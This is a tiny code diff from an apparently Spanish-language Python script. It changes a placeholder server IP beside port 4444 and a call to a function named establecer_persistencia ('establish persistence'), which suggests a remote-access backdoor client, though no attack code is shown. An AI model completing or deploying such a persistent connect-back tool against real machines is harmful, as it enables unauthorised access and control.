@@ -115,7 +115,7 @@ def crear_interfaz(server_ip, server_port):
 
 # Configuración principal
 if __name__ == "__main__":
-    SERVER_IP = "tu ip"  # Cambia por la IP de tu servidor
+    SERVER_IP = "tu_ip"  # Cambia por la IP de tu servidor
     SERVER_PORT = 4444        # Cambia por el puerto que usarás
 
     establecer_persistencia()
